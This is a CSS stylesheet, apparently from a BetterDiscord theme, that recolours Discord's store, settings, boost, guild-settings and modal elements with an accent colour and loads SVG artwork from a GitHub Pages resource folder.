.tier1HeaderBackground-3LjWgU {								/* submodal				tier1 bg							*/
	background-color: rgb(var(--vaccentcolor));
}
.headerTier1-2Ckjmd .wrapper-1P_m9K image:not([width="170px"]),
.tier1HeaderBackground-3LjWgU .wrapper-1P_m9K image:not([width="170px"]) {
	display: none !important;
}
.tier1-1ttHRY.banner-3Kac2g {
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.tier2-3pW_6T,
.headerTier2-3FKMxd,										/* submodal				tier2 header						*/
.tier2HeaderBackground-2BUqcl {								/* submodal				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.tier2-3hSil0.banner-3Kac2g {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}

.price-1rEl-z {												/* submodal				price								*/
	color: rgb(var(--vaccentcolor));
}

.iconBackgroundTier1-2GOcU8 {								/* tierlist				tier1 bg							*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.iconBackgroundTier2-2TeI3a {								/* tierlist				tier2 bg							*/
	background: #ffcd4b linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

.xboxPromotion-1k0m0c {										/* bannerpromo			xboxpromo							*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.bannerPromotionLogoPremium-2cB301 {						/* bannerpromo			logo								*/
	background: #ffcd4b linear-gradient(rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.premiumLogo-1D3iJc {										/* bannerpromo			nitro logo							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .tag-HanR-9 {									/* tag														*/
	background: rgb(255, 255, 255) linear-gradient(45deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .tag-HanR-9::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/04a2e1509ad72be575b1529b51ea3977.svg) top/cover no-repeat;
}

.skuButtonTier1-2XTq5D,
.skuButtonTier1-3-EFd9 {
	background: rgb(255, 255, 255) linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5) 75.25%);
}
.skuButtonTier2-2asv3-,
.skuButtonTier2-i01WfL {
	background: #ffcd4b linear-gradient(32.3deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}

#app-mount .alternativeSkuSelected-3Qhw9n {
	background-color: rgb(var(--vaccentcolor));
}

.overlappingBorder-1-XPGl {									/* store				preview image						*/
	border-color: rgb(var(--vaccentcolor));
}

#app-mount .headerFancy-1AcCLF {							/* store				header fancy						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .premiumHeaderPrice-1F1CMD {						/* store				price								*/
	background-color: rgb(var(--vaccentcolor));
}
.premiumCircle-3jgziV {										/* store				premiumcircle						*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .staffIcon-2MB1se {								/* store				stafficon							*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .nitroIcon-2uS3VJ {								/* store				nitroicon							*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.perkTag-2O4dx4 {											/* store				perktag								*/
	background: rgb(255, 255, 255) linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
.confirmPremiumIcon-26GX5Y,									/* store				confirmpremiumicon					*/
.gameIcon-gg34Dz[style*="/assets/f6cbcdc9366fb8d31e03bdc6c9c50246.svg"] {
	background-color: rgb(255, 255, 255) !important;
	background-image: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/nitrobadge_details.svg), linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5)) !important;
}
.pageWrapper-3F6owx {										/* store				pagewrapper							*/
	background: white linear-gradient(114deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.6));
}


/* ~~~~		6.		LIBRARY							~~~~ */

.foreground-2aE44H {										/* installationpath		fill								*/
	stroke: rgb(var(--vaccentcolor));
}


/* ~~~~		7.		DISCOVERY						~~~~ */

.searchBox-3Y2Vi7:focus,									/* searchbox			focus								*/
.searchBox-3Y2Vi7:focus-within,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus,
.searchPage-3GKAdT .search-1iTphC .searchBox-2_mAlO:focus-within {
	border-color: rgb(var(--vaccentcolor));
}
.search-1iTphC .searchBox-2_mAlO:focus,
.search-1iTphC .searchBox-2_mAlO:focus-within {
	box-shadow: 0 0 0 1px rgb(var(--vaccentcolor)), 0 0 0 2px rgba(var(--vaccentcolor), 0.6), 0 0 0 3px rgba(var(--vaccentcolor), 0.3);
}

#app-mount .activeButton-1BJAiN,							/* pagination			button								*/
#app-mount .activeButton-1BJAiN:hover {
	background-color: rgb(var(--vaccentcolor));
}

															/* categorylist			selected item						*/
.categoryItem-3zFJns.selectedCategoryItem-3X8ujp .itemInner-3gVXMG {
	background-color: rgb(var(--vaccentcolor));
}

.categoryPill-34fszg.selected-1dONk0 {						/* categorylist			search categorypill					*/
	background-color: rgb(var(--vaccentcolor));
}


/* ~~~~		8.		USERSETTINGS					~~~~ */

.item-PXvHYJ[style^="color: rgb(114, 137, 218)"],
.item-PXvHYJ[style*=" color: rgb(114, 137, 218)"] {			/* settingsitems		item								*/
	color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ[style*="background-color: rgba(114, 137, 218, 0.1)"] {
	background-color: rgb(var(--vaccentcolor), 0.1) !important;
}
.item-PXvHYJ[style*="background-color: rgb(114, 137, 218)"] {
	background-color: rgb(var(--vaccentcolor)) !important;
}
.item-PXvHYJ:not(.selected-3s45Ha)[aria-controls="Nitro Server Boost-tab"],
.item-PXvHYJ[style^="color: rgb(114, 137, 218)"][aria-controls="GUILD_PREMIUM-tab"],
.item-PXvHYJ[style*=" color: rgb(114, 137, 218)"][aria-controls="GUILD_PREMIUM-tab"] {
	color: rgb(var(--vaccentcolor2)) !important;
}
.item-PXvHYJ:hover[aria-controls="Nitro Server Boost-tab"],
.item-PXvHYJ[style*="background-color: rgba(114, 137, 218, 0.1)"][aria-controls="GUILD_PREMIUM-tab"] {
	background-color: rgb(var(--vaccentcolor2), 0.1) !important;
}
.item-PXvHYJ.selected-3s45Ha[aria-controls="Nitro Server Boost-tab"],
.item-PXvHYJ[style*="background-color: rgb(114, 137, 218)"][aria-controls="GUILD_PREMIUM-tab"] {
	background-color: rgb(var(--vaccentcolor2)) !important;
}

.dot-2s_oHI {												/* settingsitems		dot									*/
	background-color: rgb(var(--vaccentcolor));
}

.cardBrand-39zmMQ {											/* settingsitems		card								*/
	background-color: rgb(var(--vaccentcolor));
}
.cardBrand-39zmMQ,
.cardBrandOutline-3jvFfo {
	border-color: rgb(var(--vaccentcolor));
}

.avatarUploaderInner-3UNxY3 {								/* accountsettings		avatar upload						*/
	background-color: rgb(var(--vaccentcolor));
}

#app-mount .questionMark-CWEQZn,							/* accountsettings		questionmark						*/
#app-mount .questionMark-3qBhGj {							/* accountsettings		questionmark new					*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .questionMark-CWEQZn:hover,
#app-mount .questionMark-3qBhGj:hover {
	background: var(--vaccentcolor-hover);
}

.marketingLogoImage-2SzXIR {								/* boostsettings		boost header						*/
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_bg.svg) center/cover no-repeat;
}
.marketingLogoImage-2SzXIR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_boostheader_accent.svg) center/cover no-repeat;
}
#app-mount .tierUnlocked-27DwHo {							/* boostsettings		tierunlocked						*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .tierAccomplished-2eXPdI,
#app-mount .tierCurrent-Lw7-4E,
#app-mount .tierDefault-2qaRkD {
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor2)), rgba(var(--vaccentcolor2), 0.5));
}
#app-mount .tierCloseHint-380zIA {							/* boostsettings		tierclosehint						*/
	background-color: rgb(var(--vaccentcolor));
}
#app-mount .tierCloseHint-380zIA::before {
	border-right-color: rgb(var(--vaccentcolor));
}
#app-mount .tierHeaderUnlockedBackground-MW5XJU {			/* boostsettings		tierheaderunlockedbg				*/
	background: #ffcd4b linear-gradient(90deg, rgb(var(--vaccentcolor)), rgba(var(--vaccentcolor), 0.5));
}
#app-mount .foreground-2EIns2 {								/* boostsettings		icon foreground						*/
	color: rgb(var(--vaccentcolor2));
}
.emojiIcon-2xOPMD {											/* boostsettings		perkicon emoji						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(75%);
}
.uploadSizeIcon-2HNa5p {									/* boostsettings		perkicon upload						*/
	color: rgb(var(--vaccentcolor2));
	filter: brightness(75%);
}
.memberBadgeIcon-1hpSQc {									/* boostsettings		perkicon guild						*/
	color: rgb(var(--vaccentcolor));
	filter: brightness(150%);
}
.profileBadgeIcon-_ctnKj {									/* boostsettings		perkicon badge						*/
	position: relative;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_boostbadge_bg.svg) center/contain no-repeat;
}
.profileBadgeIcon-_ctnKj::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/usersettings_boostbadge_accent.svg) center/contain no-repeat;
}
.premiumGuildIcon-13KUPa {									/* boostsettings		perkicon premium					*/
	color: rgb(var(--vaccentcolor2));
}
.gemWithLabel-2aecE_ {										/* boostsettings		progress label						*/
	color: rgb(var(--vaccentcolor2));
}
.gemIndicatorProgressCircle-3wDFa1 {						/* boostsettings		progress circle						*/
	color: rgb(var(--vaccentcolor2));
}
.guildSubscriberCountIcon-6Fo5EK {							/* boostsettings		sub count							*/
	color: rgb(var(--vaccentcolor2));
}
.guildSubscriptionSlotIcon-EVE04u {							/* boostsettings		slot icon							*/
	color: rgb(var(--vaccentcolor2));
}

.icon-3j1dJB {												/* hypesettings			perk icon							*/
	position: relative;
}
.icon-3j1dJB::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/common/empty.svg) center/cover no-repeat;
}

.wrapper-3jrx9n {											/* overlaysettings		positionsettings wrapper			*/
	border-color: rgb(var(--vaccentcolor));
}
.option-n0icdO:hover {										/* overlaysettings		positionoption						*/
	background-color: rgb(var(--vaccentcolor));
}
.selected-mKYnfr.option-n0icdO {
	background-color: rgb(var(--vaccentcolor));
	border-color: rgb(var(--vaccentcolor));
}
															/* streamermodesettings	headerimage							*/
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_streamermode_bg.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + * {
	position: relative;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before,
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	content: "";
	position: absolute;
	top: 0;
	right: -204px;
	width: 184px;
	height: 110px;
	pointer-events: none;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_streamermode_accent.svg) center/contain no-repeat;
}
.noticeIcon-1phvR2[src="/assets/616e078b351d0df460971441949c53a3.svg"] + *::after {
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_streamermode_details.svg) center/contain no-repeat;
}


/* ~~~~		9.		GUILDSETTINGS					~~~~ */
															/* widgetsettings		widget placeholder image 			*/
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type {
	position: relative !important;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type img[src="/assets/5fb477ca84edd15d9a2888ac28365acd.svg"] {
	object-position: -999999px -999999px;
	flex: unset !important;
	height: 310px !important;
	min-width: 320px !important;
	background: var(--background-tertiary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_widget_bg.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before,
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	content: "";
	position: absolute;
	right: 0;
	bottom: 0;
	width: 320px;
	height: 310px;
	pointer-events: none;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::before {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_widget_accent.svg) center/contain no-repeat;
}
.layer-3QrUeG[aria-label="GUILD_SETTINGS"] .contentRegion-3nDuYy .contentColumn-2hrIYH > div > div > .divider-3573oO + .flex-1xMQg5 + .divider-3573oO + .flex-1xMQg5:last-of-type::after {
	background: var(--header-primary);
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_widget_details.svg) center/contain no-repeat;
}

@-webkit-keyframes pulseBorder-1LZYy9 { 					/* intergrationsettings	new webhook							*/
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}
@keyframes pulseBorder-1LZYy9 {
	0% {border-color: transparent;}
	50% {border-color: rgb(var(--vaccentcolor));}
	to {border-color: transparent;}
}


.placeholderImage-37MstR {									/* discoverysettings	insight								*/
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_insight_bg.svg) center/cover no-repeat;
}
.placeholderImage-37MstR::after {
	content: "";
	position: absolute;
	top: 0;
	right: 0;
	bottom: 0;
	left: 0;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_insight_accent.svg) center/cover no-repeat;
}
															/* discoverysettings	partner program						*/
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] {
	object-position: -999999px -999999px;
	filter: grayscale(0.5);
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_partnerprogram_bg.svg) center/cover no-repeat;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + * {
	position: relative;
	display: flex;
	justify-content: center;
}
.banner-2AwsUs[src="/assets/b3d9ebeb2259945abe78c49206f5b62d.svg"] + *::after {
	content: "";
	position: absolute;
	top: -281px;
    width: 428px;
    height: 241px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_partnerprogram_accent.svg) center/cover no-repeat;
}

.defaultIcon-2NMkWn {										/* discoverysettings	default guildicon					*/
	background-color: rgb(var(--vaccentcolor));
}

															/* discoverysettings	requirements icon					*/
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"],
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] {
	object-position: -999999999px -999999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_requirements_bg.svg) center/cover no-repeat;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + * {
	position: relative;
	height: 60px;
}
.requirementsImage-tqIP2X[src="/assets/ec3ea47d6b85de83ab2c298ddecf7df2.svg"] + *::after,
.headerIcon-2S6VR5[src="/assets/8bfa6300dd6ce22829ffa093fb87da9f.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	bottom: 10px;
	width: 40px;
	height: 40px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_requirements_accent.svg) center/cover no-repeat;
}

.featureIcon-3p1TC_ [fill="#7289da" i] {					/* communitysettings	intro		featureicon				*/
	fill: rgb(var(--vaccentcolor));
}

.info-1LuGpo {												/* communitysettings	partnership							*/
	color: rgb(var(--vaccentcolor));
}

.fakeButton-kGEmb3 {										/* communitysettings	rules		example fake			*/
	background-color: rgb(var(--vaccentcolor));
}

.exampleWumpus-3QIhvG .wumpus-3Q6pSF,						/* communitysettings	rules		wumpus					*/
.exampleWumpus-1zk2dq .wumpus-3JzuYd {						/* communitysettings	welcome		wumpus					*/
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpus_bg.svg) center/cover no-repeat;
}
.exampleWumpus-3QIhvG::after,
.exampleWumpus-1zk2dq::after {
	content: "";
	position: absolute;
	width: 82px;
	height: 72px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpus_accent.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d,						/* communitysettings	rules		wumpus icon				*/
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {				/* communitysettings	rules		wumpus icon				*/
	position: relative;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + * {
	display: flex;
	justify-content: center;
	white-space: pre;
}
.exampleModal-2oh58d .guildIcon-38Zs0M,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p {
	object-position: -999999px -999999px;
	border-radius: 10px;
	background: white url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpusicon_bg.svg) center/cover no-repeat;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after {
	top: 0;
	width: 48px;
	height: 48px;
}
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	top: -80px;
	width: 64px;
	height: 64px;
}
.exampleModal-2oh58d .guildInfo-3Co_-d::after,
.exampleModal-2X2Vf8 .guildIcon-1F8t_p + *::after {
	content: "";
	position: absolute;
	border-radius: 10px;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildsettings_wumpusicon_accent.svg) center/cover no-repeat;
}


/* ~~~~		10.		MODALS							~~~~ */

/* ----		10.1.	USERMODAL						---- */

.topSectionPlaying-1J5E4n {									/* modal				topsection playing					*/
	background: rgb(var(--vaccentcolor));
}

.container-q03LZO.colored-1armap .profileBadgeStaff-3BXdTO {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/4358ad1fb423b346324516453750f569.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileBadgePartner-j6Lwhr {
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://discordapp.com/assets/6203964d9d25c394a573fd4f6be36d97.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl1-3oI9tx {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/24e49184598820f274e62293349a2e43.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl2-r6nJHT {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/cc73fba5c2e9b70752bbd1db35a1b9c3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl3-38s3Dj {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/a4c3939a9b03274246df9b144fcd86cf.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl4-2NXrsI {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/d01bee8a9b41bd9dda26a43221b2e7e8.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl5-3XIa2K {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/a99def5f819c077e5e5061cab741b7e6.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl6-3e3sxW {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/2cfb317f3db3963d8ded9a97ee967bac.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl7-1dVhQT {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/278736f579d810b11ddf308cb598b19e.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl8-1kXdFr {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/38e40f25802a0fdf480d9b855a37a2f3.svg) center/contain no-repeat;
}
.container-q03LZO.colored-1armap .profileGuildSubscriberlvl9-1d6zav {
	background: rgb(var(--vaccentcolor2));
	-webkit-mask: url(https://discordapp.com/assets/cfbc2d8ceacfacf07850f986c8165195.svg) center/contain no-repeat;
}

.guildAvatarWithoutIcon-1sTmE_ {							/* modal				shared servers no icon				*/
	background-color: rgb(var(--vaccentcolor));
}

/* ----		10.2.	GUILDADD/CREATION				---- */
															/* create guild			create own icon						*/
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] {
	object-position: -999999px -999999px;
	background: rgb(var(--vaccentcolor));
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildcreate_createown_accent.svg) center/contain no-repeat;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + * {
	position: relative;
	display: flex;
	align-items: center;
	overflow: visible;
}
.icon-QM5383[src="/assets/79516499036b21acd5f56ccba0635c38.svg"] + *::after {
	content: "";
	position: absolute;
	left: -56px;
	width: 48px;
	height: 48px;
	pointer-events: none;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/guildcreate_createown_bg.svg) center/contain no-repeat;
}

.uploadIcon-2IFzZU [fill="#7289da" i] {						/* create guild			upload icon							*/
	fill: rgb(var(--vaccentcolor));
}

/* ----		10.3.	REGIONSELECTMODAL				---- */

.regionSelectFlag-3uwFtG,									/* modal				regionselect flag					*/
.regionSelectFlag-1htPow {
	background-color: rgb(var(--vaccentcolor));
}
.vip-3pFIN8::after,											/* modal				regionselect vip					*/
.vip-1SuRbe::after {
	background: rgb(var(--vaccentcolor));
}
.regionSelect-3lf4eE button {								/* modal				regionselect button					*/
	color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover .regionSelectInner-24f4Ce,
#app-mount .regionSelect-3lf4eE:hover button {
	border-color: rgb(var(--vaccentcolor));
}
#app-mount .regionSelect-3lf4eE:hover button {
	background-color: rgb(var(--vaccentcolor));
}
.regionSelectModal-12e-57 .regionSelectModalHeader-21khC1 {	/* modal				regionselect header					*/
	color: rgb(var(--vaccentcolor));
}
															/* modal				regionselect option					*/
.regionSelectModal-12e-57 .regionSelectModalOption-2DSIZ3:hover {
	border-color: rgb(var(--vaccentcolor));
}
.check-2by_h9 {
	-webkit-mask: url(https://discordapp.com/assets/6acb20d5e709b34b6a7f36ec13648666.svg);
	background: rgb(var(--vaccentcolor));
}

/* ----		10.4.	UPLOADMODAL						---- */
															/* modal				background							*/
.uploadModalIn-1z07Bv .uploadDropModal-2kTwbc .bgScale-1otPtc {
	background-color: rgb(var(--vaccentcolor));
}

.attachment-33OFj0 .icon-1kp3fr,
.audioMetadata-3zOuGv::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j),
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j) {
	object-position: -999999px -999999px;
	background: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_bg.svg) center/contain no-repeat !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after,
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	content: "";
	position: absolute;
	pointer-events: none;
	background: rgb(var(--vaccentcolor));
}
.markup-2BOw-j > .attachment-33OFj0 {
    position: relative;
}
.attachment-33OFj0 .icon-1kp3fr {
	background-size: 120% !important;
}
.audioMetadata-3zOuGv::before {
	background-position: center -4px !important;
	background-size: 140% !important;
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.attachment-33OFj0 .icon-1kp3fr + *::after {
	top: 9px;
	left: 8px;
	width: 36px;
	height: 48px;
}
.markup-2BOw-j > .attachment-33OFj0 .icon-1kp3fr + *::before,
.markup-2BOw-j > .attachment-33OFj0 .icon-1kp3fr + *::after {
	top: 6px;
	left: 7px;
}
.audioMetadata-3zOuGv > *:first-child::before,
.audioMetadata-3zOuGv > *:first-child::after {
	top: 0;
	left: 5px;
	width: 34px;
	height: 56px;
}
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	width: 100px;
	height: 130px;
}
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .error-kKl9o2 .icon-kyxXVr:not(.image-2yrs5j)::after {
	background: rgb(240, 71, 71);
}
.attachment-33OFj0 .icon-1kp3fr + *::before,
.audioMetadata-3zOuGv > *:first-child::before,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::before,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::before {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_details.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.unknown-3TPTMr::after,
.uploadModal-2ifh8j .icon-kyxXVr:not(.image-2yrs5j)::after,
.uploadModalIn-1z07Bv .icon-kyxXVr:not(.image-2yrs5j)::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/common/empty.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="acrobat"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.acrobat-3K1PC6::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_acrobat_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ae"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ae-1Y5Jq3::after {
	-webkit-mask: url(https://mwittrien.github.io/BetterDiscordAddons/Themes/_res/svgs/blurple/files_ae_accent.svg) center/contain no-repeat;
}
.attachment-33OFj0 .icon-1kp3fr[title="ai"] + *::after,
.uploadModal-2ifh8j .icon-kyxXVr.ai-11KAaB::after {
